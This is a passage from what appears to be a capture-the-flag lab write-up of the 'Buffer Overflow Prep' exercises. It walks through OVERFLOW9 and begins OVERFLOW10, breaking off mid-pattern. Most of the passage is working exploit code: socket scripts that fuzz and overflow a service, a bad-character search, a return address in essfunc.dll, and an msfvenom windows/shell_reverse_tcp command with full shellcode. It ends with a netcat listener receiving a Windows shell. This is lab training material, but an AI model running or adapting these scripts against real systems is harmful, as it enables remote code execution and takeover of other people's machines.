Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co 
```
{% endraw %}

<br />
Update the code with the pattern_create string that we just generated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 2000
inputBuffer = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW9 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the EIP and note the value that is stored in the register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of9/thirdeip.png" title="Get EIP Value" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run the string from the regster through msf-pattern_offset to get the exact offset.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW9]
└─$ msf-pattern_offset -l 2000 -q 35794234
[*] Exact match at offset 1514
```
{% endraw %}

<br />
Update the code to include the offset value that we just calculated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 1514
inputBuffer += b'B' * 4
inputBuffer += b'C' * (2000 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW9 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Run the script and view the 42s in EIP.  Update the code with a list of all the badchars wo we can test them.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 1514
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (2000 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW9 ' + inputBuffer + b'\r\n')

s.close()
 
```
{% endraw %}

<br />
Check the ESP register to view the baschars and find any mangles.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of9/firstbadesp.png" title="First Badchar ESP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Look for sections where the string drops, missing, or change.  Remove the bad character from the set.  Resend it and scan ESP for more bad characters.  Repeat until you have found them all.  Gotta catch 'em all.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# baddies = \x00\x04\x3e\x3f\xe1

badchars = (
  b"\x01\x02\x03\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 1514
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (2000 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW9 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Update the code to change the badchars to payload = b'D' * 400 as a stub for the payload.  Then, in WinDBG, load the narly extension.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of9/narly.png" title="Load Narly" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run nmod to get a list of modules and their security to find the appropriate module.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of9/findaddy.png" title="Find address" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code with the address that was discovered in the essfunc.dll.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\x04\x3e\x3f\xe1

payload = b'D' * 400

inputBuffer = b'A' * 1514
inputBuffer += pack('<L',(0x625011af))
inputBuffer += payload
inputBuffer += b'C' * (2000 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW9 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Use msfvenom to generate a payload.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW9]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -f python -v payload -b '\x00\x04\x3e\x3f\xe1'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1899 bytes
payload =  b""
payload += b"\xba\x10\x0b\x1d\x37\xd9\xc9\xd9\x74\x24\xf4"
payload += b"\x5b\x31\xc9\xb1\x52\x31\x53\x12\x83\xeb\xfc"
payload += b"\x03\x43\x05\xff\xc2\x9f\xf1\x7d\x2c\x5f\x02"
payload += b"\xe2\xa4\xba\x33\x22\xd2\xcf\x64\x92\x90\x9d"
payload += b"\x88\x59\xf4\x35\x1a\x2f\xd1\x3a\xab\x9a\x07"
payload += b"\x75\x2c\xb6\x74\x14\xae\xc5\xa8\xf6\x8f\x05"
payload += b"\xbd\xf7\xc8\x78\x4c\xa5\x81\xf7\xe3\x59\xa5"
payload += b"\x42\x38\xd2\xf5\x43\x38\x07\x4d\x65\x69\x96"
payload += b"\xc5\x3c\xa9\x19\x09\x35\xe0\x01\x4e\x70\xba"
payload += b"\xba\xa4\x0e\x3d\x6a\xf5\xef\x92\x53\x39\x02"
payload += b"\xea\x94\xfe\xfd\x99\xec\xfc\x80\x99\x2b\x7e"
payload += b"\x5f\x2f\xaf\xd8\x14\x97\x0b\xd8\xf9\x4e\xd8"
payload += b"\xd6\xb6\x05\x86\xfa\x49\xc9\xbd\x07\xc1\xec"
payload += b"\x11\x8e\x91\xca\xb5\xca\x42\x72\xec\xb6\x25"
payload += b"\x8b\xee\x18\x99\x29\x65\xb4\xce\x43\x24\xd1"
payload += b"\x23\x6e\xd6\x21\x2c\xf9\xa5\x13\xf3\x51\x21"
payload += b"\x18\x7c\x7c\xb6\x5f\x57\x38\x28\x9e\x58\x39"
payload += b"\x61\x65\x0c\x69\x19\x4c\x2d\xe2\xd9\x71\xf8"
payload += b"\xa5\x89\xdd\x53\x06\x79\x9e\x03\xee\x93\x11"
payload += b"\x7b\x0e\x9c\xfb\x14\xa5\x67\x6c\x11\x3a\x67"
payload += b"\x6a\x4d\x38\x67\x73\x36\xb5\x81\x19\x58\x90"
payload += b"\x1a\xb6\xc1\xb9\xd0\x27\x0d\x14\x9d\x68\x85"
payload += b"\x9b\x62\x26\x6e\xd1\x70\xdf\x9e\xac\x2a\x76"
payload += b"\xa0\x1a\x42\x14\x33\xc1\x92\x53\x28\x5e\xc5"
payload += b"\x34\x9e\x97\x83\xa8\xb9\x01\xb1\x30\x5f\x69"
payload += b"\x71\xef\x9c\x74\x78\x62\x98\x52\x6a\xba\x21"
payload += b"\xdf\xde\x12\x74\x89\x88\xd4\x2e\x7b\x62\x8f"
payload += b"\x9d\xd5\xe2\x56\xee\xe5\x74\x57\x3b\x90\x98"
payload += b"\xe6\x92\xe5\xa7\xc7\x72\xe2\xd0\x35\xe3\x0d"
payload += b"\x0b\xfe\x03\xec\x99\x0b\xac\xa9\x48\xb6\xb1"
payload += b"\x49\xa7\xf5\xcf\xc9\x4d\x86\x2b\xd1\x24\x83"
payload += b"\x70\x55\xd5\xf9\xe9\x30\xd9\xae\x0a\x11" 
```
{% endraw %}

<br />
Update the code with a nop sled and the payload we just generated.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\x04\x3e\x3f\xe1

payload =  b""
payload += b"\xba\x10\x0b\x1d\x37\xd9\xc9\xd9\x74\x24\xf4"
payload += b"\x5b\x31\xc9\xb1\x52\x31\x53\x12\x83\xeb\xfc"
payload += b"\x03\x43\x05\xff\xc2\x9f\xf1\x7d\x2c\x5f\x02"
payload += b"\xe2\xa4\xba\x33\x22\xd2\xcf\x64\x92\x90\x9d"
payload += b"\x88\x59\xf4\x35\x1a\x2f\xd1\x3a\xab\x9a\x07"
payload += b"\x75\x2c\xb6\x74\x14\xae\xc5\xa8\xf6\x8f\x05"
payload += b"\xbd\xf7\xc8\x78\x4c\xa5\x81\xf7\xe3\x59\xa5"
payload += b"\x42\x38\xd2\xf5\x43\x38\x07\x4d\x65\x69\x96"
payload += b"\xc5\x3c\xa9\x19\x09\x35\xe0\x01\x4e\x70\xba"
payload += b"\xba\xa4\x0e\x3d\x6a\xf5\xef\x92\x53\x39\x02"
payload += b"\xea\x94\xfe\xfd\x99\xec\xfc\x80\x99\x2b\x7e"
payload += b"\x5f\x2f\xaf\xd8\x14\x97\x0b\xd8\xf9\x4e\xd8"
payload += b"\xd6\xb6\x05\x86\xfa\x49\xc9\xbd\x07\xc1\xec"
payload += b"\x11\x8e\x91\xca\xb5\xca\x42\x72\xec\xb6\x25"
payload += b"\x8b\xee\x18\x99\x29\x65\xb4\xce\x43\x24\xd1"
payload += b"\x23\x6e\xd6\x21\x2c\xf9\xa5\x13\xf3\x51\x21"
payload += b"\x18\x7c\x7c\xb6\x5f\x57\x38\x28\x9e\x58\x39"
payload += b"\x61\x65\x0c\x69\x19\x4c\x2d\xe2\xd9\x71\xf8"
payload += b"\xa5\x89\xdd\x53\x06\x79\x9e\x03\xee\x93\x11"
payload += b"\x7b\x0e\x9c\xfb\x14\xa5\x67\x6c\x11\x3a\x67"
payload += b"\x6a\x4d\x38\x67\x73\x36\xb5\x81\x19\x58\x90"
payload += b"\x1a\xb6\xc1\xb9\xd0\x27\x0d\x14\x9d\x68\x85"
payload += b"\x9b\x62\x26\x6e\xd1\x70\xdf\x9e\xac\x2a\x76"
payload += b"\xa0\x1a\x42\x14\x33\xc1\x92\x53\x28\x5e\xc5"
payload += b"\x34\x9e\x97\x83\xa8\xb9\x01\xb1\x30\x5f\x69"
payload += b"\x71\xef\x9c\x74\x78\x62\x98\x52\x6a\xba\x21"
payload += b"\xdf\xde\x12\x74\x89\x88\xd4\x2e\x7b\x62\x8f"
payload += b"\x9d\xd5\xe2\x56\xee\xe5\x74\x57\x3b\x90\x98"
payload += b"\xe6\x92\xe5\xa7\xc7\x72\xe2\xd0\x35\xe3\x0d"
payload += b"\x0b\xfe\x03\xec\x99\x0b\xac\xa9\x48\xb6\xb1"
payload += b"\x49\xa7\xf5\xcf\xc9\x4d\x86\x2b\xd1\x24\x83"
payload += b"\x70\x55\xd5\xf9\xe9\x30\xd9\xae\x0a\x11"

inputBuffer = b'A' * 1514
inputBuffer += pack('<L',(0x625011af))
inputBuffer += b'\x90' * 16
inputBuffer += payload
inputBuffer += b'C' * (2000 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW9 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Start a netcat listener.  Run the code.  Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW9]
└─$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56201
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Windows Kits\10\Debuggers>
```
{% endraw %}

<br />
<b><u>OVERFLOW10<br /></u></b>

Create a script that connects to the service and sends the OVERFLOW10 command mimicking normal usage.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
print(s.recv(1024))

s.send(b'OVERFLOW10 aaaa\r\n')
print(s.recv(1024))

s.close() 
```
{% endraw %}

<br />
Update the code to fuzz the command with increasing length to find the breakpoint.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

buffers = [b'A']
counter = 100
while len(buffers) < 30:
    buffers.append(b'A' * counter)
    counter += 100

for inputBuffer in buffers:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((url,port))
    s.recv(1024)

    print('[*] Sending: {size}'.format(size=len(inputBuffer)))
    s.send(b'OVERFLOW10 ' + inputBuffer + b'\r\n')
    s.recv(1024)

    s.close() 
```
{% endraw %}

<br />
Run the code and observe the breakpoint.

{% raw %}
```python
= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW10/thm-overflow10_0x01.py
[*] Sending: 1
[*] Sending: 100
[*] Sending: 200
[*] Sending: 300
[*] Sending: 400
[*] Sending: 500
[*] Sending: 600
```
{% endraw %}

<br />
Check the EIP to ensure that we have control of EIP.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of10/firsteip.png" title="First EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the script to hardcode the size that breaks the buffer.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 1000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW10 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Run the code and check EIP to ensure that we still have control.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of10/seceip.png" title="Second EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW4]
└─$ msf-pattern_create -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B 
```
{% endraw %}

<br />
Update the code with the pattern_create string that we just generated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# inputBuffer = b'A' * 1000
inputBuffer = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0A